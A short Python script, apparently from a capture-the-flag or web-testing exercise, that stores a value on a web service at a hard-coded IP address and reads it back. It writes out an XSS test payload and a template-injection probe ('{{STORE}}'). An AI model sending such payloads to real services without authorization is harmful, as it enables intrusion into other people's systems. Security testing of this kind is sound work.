import requests

url = 'http://20.198.106.95:22001/'

def insert_val(key, val):
    r = requests.post(url + f'?save={key}', data={"echo":val})
    print(r.text)

def get_val(key):
    r = requests.get(url + f'pop/{key}')
    print(r.text)

payload = '<script>alert(1)</script>'
payload = '{{STORE}}'

insert_val("hello", payload)
get_val("hello")